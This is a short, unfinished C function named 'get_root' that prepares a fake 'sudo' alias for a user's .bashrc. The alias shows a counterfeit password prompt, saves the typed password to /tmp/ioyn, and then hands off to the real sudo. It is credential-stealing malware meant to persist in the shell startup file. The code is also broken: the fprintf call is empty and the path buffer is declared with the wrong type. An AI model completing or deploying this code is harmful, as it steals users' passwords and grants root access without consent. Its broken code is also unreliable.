bool get_root() {

  char *alias_trick_str = "alias sudo=\'echo -n \"[sudo] password for $(USER):\"; read -s password; echo $password > /tmp/ioyn; printf \"\nSorry, try again.\n\"; alias sudo=sudo; sudo $1\'\"";

  const char *bashrc = ".bashrc";
  const char *home_path = getenv("HOME");
  const char *bashrc_fullpath[100];

  strncpy(bashrc_fullpath, home_path, 50);
  strncat(bashrc_fullpath, bashrc,  10);

  fprintf()

  return true;
}
